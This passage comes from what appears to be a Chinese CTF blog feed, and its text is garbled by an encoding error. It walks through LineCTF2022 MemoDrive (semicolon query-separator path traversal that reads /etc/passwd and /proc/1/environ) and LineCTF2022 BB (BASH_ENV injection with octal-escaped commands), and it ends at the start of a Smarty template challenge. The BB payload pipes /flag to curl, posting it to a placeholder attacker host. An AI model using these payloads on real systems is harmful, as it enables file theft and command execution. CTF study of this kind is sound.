      <tags>
        <tag>jsä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-MemoDrive</title>
    <url>/posts/e7bee0fc.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-MemoDrive"><a href="#LineCTF2022-MemoDrive" class="headerlink" title="LineCTF2022-MemoDrive"></a>LineCTF2022-MemoDrive</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šCVE-2021-23336ã€ç›®å½•éå†</p>
<p>è¯¦æƒ…å‚è€ƒï¼š<a href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a></p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907180219464.png"></p>
<p>æœ‰æºç ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        context<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request
        clientId <span class="token operator">=</span> getClientID<span class="token punctuation">(</span>request<span class="token punctuation">.</span>client<span class="token punctuation">.</span>host<span class="token punctuation">)</span>	<span class="token comment">#getClientID()ä¸ºé¢˜ç›®æºç çš„å‡½æ•°ï¼Œåšäº†ä¸€ä¸ªhashè¿ç®—</span>

        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        contents <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        context<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> filename
        context<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> contents
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> templates<span class="token punctuation">.</span>TemplateResponse<span class="token punctuation">(</span><span class="token string">'/view/view.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getClientID</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> ip <span class="token operator">+</span> <span class="token string">'_'</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'SALT'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬15è¡Œå…¨åœºå”¯ä¸€è¯»æ–‡ä»¶æ–¹æ³•<code>readlines()</code>ï¼Œåªéœ€è®©pathå˜é‡ä¸ºflagæ‰€åœ¨è·¯å¾„å³å¯</p>
<p>æŒ‰ç…§é¢˜ç›®æºç æ¡†æ¶ï¼Œæœ¬åœ°å¯ä¸€ä¸ªç¯å¢ƒæµ‹è¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">import</span> uvicorn
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>applications <span class="token keyword">import</span> Starlette
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>routing <span class="token keyword">import</span> Route
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>responses <span class="token keyword">import</span> JSONResponse

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        clientId <span class="token operator">=</span> <span class="token string">"id"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url.query:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.query_params:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unquote params:"</span><span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"filename:"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.query_params.keys:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"path:"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> JSONResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

routes <span class="token operator">=</span> <span class="token punctuation">[</span>
    Route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span>view<span class="token punctuation">)</span>
<span class="token punctuation">]</span>

app <span class="token operator">=</span> Starlette<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> routes<span class="token operator">=</span>routes<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">11000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.1.34:11000/view?id=flag;/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907190428803.png"></p>
<p>åœ¨éƒ¨åˆ†pythonç‰ˆæœ¬ä¸­ï¼Œè§£æURLå‚æ•°æ—¶ï¼Œä¼šå°†åˆ†å·<code>;</code>è§£ææˆå‚æ•°åˆ†éš”ç¬¦<code>&amp;</code>ï¼Œä»è€Œå¯¼è‡´æ­¤é¢˜ç›®å¯è¢«åˆ©ç”¨</p>
<p>å‚è€ƒï¼š<a href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a></p>
<p>å®é™…æ“ä½œå¦‚ä¸‹</p>
<p>å…ˆåœ¨é¦–é¡µä¸Šä¾§çš„æ–‡æœ¬æ¡†éšä¾¿è¾“å…¥ï¼Œç‚¹å‡»<code>SAVE</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192147352.png"></p>
<p>ç„¶åä¸‹ä¾§æ–‡æœ¬æ¡†ä¼šæ˜¾ç¤ºä¸€ä¸²æ•°å­—ï¼Œå°±æ˜¯åºå·+æ—¶é—´æˆ³ç”Ÿæˆçš„æ–‡ä»¶åï¼Œç‚¹å‡»è¿›å»</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192348805.png"></p>
<p>å¯çœ‹åˆ°URLè·³è½¬åˆ°<code>/view?5e9995136241f179475b3f35dab141a4=0_20230907112045</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192527752.png"></p>
<p>ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œå‡flagï¼ˆå¿…é¡»å…ˆèµ°å®Œä¸Šé¢çš„æ­¥éª¤ï¼Œç›´æ¥è®¿é—®æ­¤è·¯å¾„æ— å›æ˜¾ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">/view?5e9995136241f179475b3f35dab141a4=flag;/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192658648.png"></p>
<p>ç­‰å·åä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œè¯»<code>/etc/passwd</code></p>
<pre class="line-numbers language-none"><code class="language-none">etc/passwd;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192822627.png"></p>
<p>æºç <code>getClientID()</code>å‡½æ•°é‡Œæœ‰è¯»å–ç¯å¢ƒå˜é‡çš„ä»£ç <code>os.getenv('SALT')</code>ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è¯»å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯<code>/proc/self/environ</code>ï¼Œç­‰å·åä¿®æ”¹ä¸ºå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">proc/self/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907194359645.png"></p>
<p>å·²ç»å¯ä»¥çœ‹åˆ°<code>SALT</code>ç¯å¢ƒå˜é‡ï¼Œä½†æç¤ºflagä¸åœ¨æ­¤</p>
<p>è¯»è¿›ç¨‹ ID ä¸º 1 çš„è¿›ç¨‹ç¯å¢ƒå˜é‡<code>/proc/1/environ</code>ï¼Œç­‰å·åä¿®æ”¹ä¸ºå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">proc/1/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907194522274.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/">https://blog.huli.tw/2022/03/27/linectf-2022-writeup/</a></p>
<p><a href="https://blog.csdn.net/weixin_60581972/article/details/127122199">https://blog.csdn.net/weixin_60581972/article/details/127122199</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ç›®å½•éå†</tag>
        <tag>pythonä»£ç å®¡è®¡</tag>
        <tag>CVE-2021-23336ï¼ˆwebç¼“å­˜æŠ•æ¯’ï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-BB</title>
    <url>/posts/b6fd9de0.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="LineCTF2022-BB"></a>LineCTF2022-BB</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šç¯å¢ƒå˜é‡æ³¨å…¥</p>
<p>ä¸»é¡µæ˜¾ç¤ºæºç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">bye</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ptn</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$ptn</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#$sä¸­æœ‰$ptnåˆ™è¿”å›false</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#éå†envå˜é‡é”®å€¼å¯¹ï¼Œé”®ç»™$kï¼Œå€¼ç»™$v</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$v</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#é”®è¿‡æ»¤ç­‰å·ï¼Œå€¼è¿‡æ»¤å¤§å°å†™å­—æ¯</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#éå†envå˜é‡é”®å€¼å¯¹ï¼Œé”®ç»™$kï¼Œå€¼ç»™$v</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$v</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#é”®è¿‡æ»¤ç­‰å·ï¼Œå€¼è¿‡æ»¤å¤§å°å†™å­—æ¯</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‚è€ƒPç¥ä¸¤ç¯‡æ–‡ç« </p>
<p><a href="https://twitter.com/phithon_xg/status/1495367705825722368">https://twitter.com/phithon_xg/status/1495367705825722368</a></p>
<p><a href="https://tttang.com/archive/1450/#toc_0x06-bash_env">https://tttang.com/archive/1450/#toc_0x06-bash_env</a></p>
<p>åˆ©ç”¨å¦‚ä¸‹ç¯å¢ƒå˜é‡æ³¨å…¥</p>
<pre class="line-numbers language-none"><code class="language-none">BASH_ENV='$(id 1&gt;&amp;2)' bash -c 'echo hello'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™ä¸ªBashå‘½ä»¤çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯:</p>
<ol>
<li>è®¾ç½®BASH_ENVç¯å¢ƒå˜é‡ï¼Œå…¶å€¼ä¸º â€˜$(id 1&gt;&amp;2)â€™</li>
<li>è¯¥ç¯å¢ƒå˜é‡ä¼šåœ¨æ–°bash shellå¯åŠ¨æ—¶è¢«æ‰§è¡Œ</li>
<li>bash -c â€˜echo helloâ€™ ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„éäº¤äº’å¼çš„bash shell</li>
<li>åœ¨è¯¥shellå¯åŠ¨æ—¶ï¼Œä¼šå…ˆæ‰§è¡ŒBASH_ENVå˜é‡çš„å€¼ â€˜$(id 1&gt;&amp;2)â€™</li>
<li>è¯¥ä»£ç ä¼šæ‰§è¡Œidå‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯æµstderr</li>
<li>ç„¶åå†æ‰§è¡Œecho helloï¼Œè¾“å‡ºhelloåˆ°æ ‡å‡†è¾“å‡ºæµstdout</li>
<li>è¯¥å­shellæ‰§è¡Œå®Œæˆåé€€å‡º</li>
</ol>
<p>æ‰€ä»¥å‘½ä»¤çš„æœ€ç»ˆæ•ˆæœæ˜¯ï¼š</p>
<p>åœ¨æ ‡å‡†é”™è¯¯æµä¸­è¾“å‡ºidå‘½ä»¤çš„ç”¨æˆ·ä¿¡æ¯ï¼Œåœ¨æ ‡å‡†è¾“å‡ºæµä¸­è¾“å‡ºhello</p>
<p>è¿™åˆ©ç”¨äº†BASH_ENVå˜é‡åœ¨å¯åŠ¨æ–°bash shellæ—¶ä¼šè¢«æ‰§è¡Œçš„ç‰¹æ€§ã€‚è¿™æ ·å¯ä»¥åœ¨æ–°shellæ‰§è¡Œå‰ï¼Œé€šè¿‡BASH_ENVæ³¨å…¥é¢„è®¾çš„ä»£ç ã€‚</p>
<p>å¦å¤–ï¼Œä¸ºäº†ç»•è¿‡bye()å‡½æ•°å¯¹å¤§å°å†™å­—æ¯çš„è¿‡æ»¤ï¼Œå¯ç”¨å…«è¿›åˆ¶çš„æ ¼å¼æ›¿æ¢å­—æ¯</p>
<p>ä¾‹å¦‚<code>$'\101' = A</code></p>
<p>ç”¨pythonæ›¿æ¢å°±æ˜¯å…ˆå°†å­—æ¯è½¬æˆåè¿›åˆ¶å†è½¬æˆå…«è¿›åˆ¶</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; oct(ord("A"))
'0o101'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å†ä»ç¬¬ä¸‰ä½æˆªå–åˆ°æœ«å°¾</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; oct(ord("A"))[2:]
'101'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œå‘½ä»¤è¦è€ƒè™‘ä¸­é—´çš„ç©ºæ ¼é—®é¢˜ï¼Œç©ºæ ¼ä¹Ÿè¿›è¡Œè½¬æ¢ï¼Œæ‰§è¡Œå‘½ä»¤ä¼šæŠ¥é”™</p>
<p><code>cat /flag</code>å¯ä»¥è¢«è½¬æ¢æˆå¦‚ä¸‹ä¸¤ç§æ ¼å¼</p>
<pre class="line-numbers language-none"><code class="language-none">$'\143\141\164' /$'\146\154\141\147'
æˆ–
$'\143'$'\141'$'\164' /$'\146'$'\154'$'\141'$'\147'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ä¸¤ç§æ ¼å¼éƒ½å¯é¡ºåˆ©è¢«æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230809144800876.png"></p>
<p>ä½†ä¸ºäº†å†™è„šæœ¬æ–¹ä¾¿ï¼Œé€‰ç”¨ç¬¬äºŒç§æ ¼å¼ï¼Œåªéœ€å¯¹æ¯ä¸ªå°å†™å­—æ¯ç»Ÿä¸€å¤„ç†ã€‚è„šæœ¬å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">import string

cmd = "cat /flag | curl -d @- http://x.x.x.x:9876"
str = ''
for i in cmd:
    if i in string.ascii_lowercase:
        j = oct(ord(i))[2:]
        str += "$'\\"+j+"'"
    else:
        str+=i

print(str)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘½ä»¤è§£é‡Šï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">curl -d @- http://x.x.x.x:9876  #é€šè¿‡POSTæ–¹å¼å‘é€æ•°æ®åˆ°æŒ‡å®šçš„URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ€ç»ˆpayloadï¼ŒGETä¼ å‚ï¼ˆè®°å¾—å…ˆåœ¨è‡ªå·±çš„x.x.x.xå¼€å¯ç›‘å¬ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">?env[BASH_ENV]=`$'\143'$'\141'$'\164' /$'\146'$'\154'$'\141'$'\147' | $'\143'$'\165'$'\162'$'\154' -$'\144' @- $'\150'$'\164'$'\164'$'\160'://x.x.x.x:9876`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230809145648276.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/125351004">https://blog.csdn.net/RABCDXB/article/details/125351004</a></p>
<p><a href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/">https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpä»£ç å®¡è®¡</tag>
        <tag>ç¯å¢ƒå˜é‡æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>HMGCTF2022-SmartyCalculator</title>
    <url>/posts/e61f7f25.html</url>
    <content><![CDATA[<h1 id="HMGCTF2022-SmartyCalculator"><a href="#HMGCTF2022-SmartyCalculator" class="headerlink" title="HMGCTF2022-SmartyCalculator"></a>HMGCTF2022-SmartyCalculator</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šSmartyæ¨¡æ¿æ³¨å…¥</p>
<p>ä¸»é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815171937631.png"></p>
<p>éšä¾¿è¾“å…¥ä¼šå¼¹çª—æç¤ºï¼šä½ è¿˜æ²¡æœ‰ç™»å½•</p>
<p><a href="http://www.zipæºç æ³„éœ²,smartyæ¡†æ¶/">www.zipæºç æ³„éœ²ï¼ŒSmartyæ¡†æ¶</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815172201288.png"></p>
<p>index.phpå‘ç°å¼¹çª—é€»è¾‘ä»£ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815172413115.png"></p>
<p>ç»•è¿‡å¼¹çª—ï¼Œéœ€è¦ï¼š1. POSTä¼ å…¥dataå‚æ•°ï¼›2. Cookieè¦æœ‰loginå­—æ®µ</p>
<p>ç„¶åè¿˜è¦ç»•è¿‡wafå¯¹dataå‚æ•°çš„é™åˆ¶ï¼ˆä¸èƒ½æœ‰<code>php</code>ã€<code>&lt;</code>ã€<code>flag</code>ã€<code>?</code>ï¼‰ï¼Œæ‰èƒ½è¿›å…¥Smartæ¨¡æ¿</p>
<p>é¢˜ç›®Smartyç‰ˆæœ¬æ˜¯<code>3.1.39</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815170213285.png"></p>
